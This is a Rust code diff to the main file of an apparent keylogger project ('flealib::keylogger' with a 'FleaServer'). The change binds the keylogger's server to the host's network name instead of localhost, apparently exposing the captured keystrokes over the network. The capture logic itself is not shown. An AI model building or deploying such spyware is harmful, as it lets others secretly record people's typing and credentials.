@@ -3,6 +3,7 @@ extern crate exitcode;
 use std::{thread, env};
 use std::sync::{Arc, Mutex};
 use std::sync::atomic::{AtomicBool, Ordering};
+use gethostname::gethostname;
 
 #[macro_use]
 extern crate log;
@@ -10,8 +11,8 @@ extern crate log;
 use flealib::fleaserver::FleaServer;
 use flealib::keylogger::*;
 
-//Change the ip address of the server according to your needs
-const SERVER_IP: &'static str = "127.0.0.1:1972";
+//Change the port number of the server according to your needs
+const SERVER_PORT: &'static str = ":1972";
 
 fn main() 
 {
@@ -32,6 +33,10 @@ fn main()
 
     remove_log_file(&current_path);
 
+    let a = gethostname();
+    let mut address: String = a.to_str().unwrap().to_string();
+    address += &String::from(SERVER_PORT);
+
     let key_logger_data = Arc::new(Mutex::new(Keylogger{quit: false}));
     let kl = Arc::clone(&key_logger_data);
 
@@ -40,7 +45,8 @@ fn main()
     });
     
     let flea_server = FleaServer{};
-    flea_server.start(SERVER_IP, &running);
+    
+    flea_server.start(&address, &running);
 
     key_logger_data.lock().unwrap().quit = true;
 
